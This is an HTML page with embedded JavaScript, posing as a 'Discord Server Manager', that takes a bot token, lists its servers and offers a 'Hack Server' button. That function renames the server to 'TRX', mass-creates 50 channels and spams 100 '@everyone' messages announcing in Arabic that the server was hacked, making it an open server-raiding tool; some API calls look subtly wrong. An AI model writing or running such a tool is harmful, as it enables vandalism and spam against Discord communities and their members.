<!DOCTYPE html>
<html>
<head>
    <title>Discord Server Manager</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #333; color: #fff; }
        .container { width: 50%; margin: 0 auto; }
        input, button { width: 100%; padding: 10px; margin: 5px 0; }
        #servers { margin-top: 20px; }
        .server { background: #444; padding: 10px; margin: 5px 0; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Discord Server Manager</h1>
        <input type="text" id="token" placeholder="Enter your bot token here">
        <button onclick="start()">Start</button>
        <div id="servers"></div>
    </div>

    <script>
        async function start() {
            const token = document.getElementById('token').value;
            const response = await fetch('https://discord.com/api/v9/users/@me/guilds', {
                headers: { 'Authorization': `Bot ${token}` }
            });
            const servers = await response.json();
            displayServers(servers, token);
        }

        async function displayServers(servers, token) {
            const container = document.getElementById('servers');
            for (const server of servers) {
                const div = document.createElement('div');
                div.className = 'server';
                div.innerHTML = `
                    <strong>Server Name:</strong> ${server.name}<br>
                    <strong>Server ID:</strong> ${server.id}<br>
                    <strong>Server Icon:</strong> <img src="https://cdn.discordapp.com/icons/${server.id}/${server.icon}.png" width="50" height="50"><br>
                    <strong>Invite Link:</strong> <a href="https://discord.gg/${server.invite}" target="_blank">Join</a><br>
                    <button onclick="hackServer('${server.id}', '${token}')">Hack Server</button>
                `;
                container.appendChild(div);
            }
        }

        async function hackServer(serverId, token) {
            await fetch(`https://discord.com/api/v9/guilds/${serverId}`, {
                method: 'PATCH',
                headers: { 'Authorization': `Bot ${token}`, 'Content-Type': 'application/json' },
                body: JSON.stringify({ name: 'TRX', icon: 'https://cdn.discordapp.com/icons/1234567890/abcdef.png' })
            });

            for (let i = 0; i < 50; i++) {
                await fetch(`https://discord.com/api/v9/guilds/${serverId}/channels`, {
                    method: 'POST',
                    headers: { 'Authorization': `Bot ${token}`, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name: 'TRX', type: 0 })
                });
            }

            for (let i = 0; i < 100; i++) {
                await fetch(`https://discord.com/api/v9/channels/${serverId}/messages`, {
                    method: 'POST',
                    headers: { 'Authorization': `Bot ${token}`, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: '@everyone @here تم التهكير من قبل ☣️ TRX  ☣️' })
                });
            }
        }
    </script>
</body>
</html>
